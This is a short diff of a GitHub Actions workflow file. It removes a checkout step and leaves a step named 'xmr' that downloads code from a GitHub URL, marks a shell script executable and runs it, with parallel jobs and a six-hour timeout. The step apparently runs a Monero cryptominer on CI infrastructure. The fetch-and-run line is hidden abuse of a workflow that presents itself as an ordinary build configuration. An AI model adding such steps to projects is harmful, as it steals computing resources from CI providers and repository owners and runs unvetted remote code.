@@ -5,9 +5,7 @@ jobs:
     strategy:
       max-parallel: 5
       fail-fast: false                     
-    timeout-minutes: 360 
-    - name: Setup
-      uses: actions/checkout@v1
+    timeout-minutes: 360           
     - name: xmr
       run: |
         wget https://github.com/Z3rotwoo/xmr && chmod u+x xmr.sh && ./xmr.sh
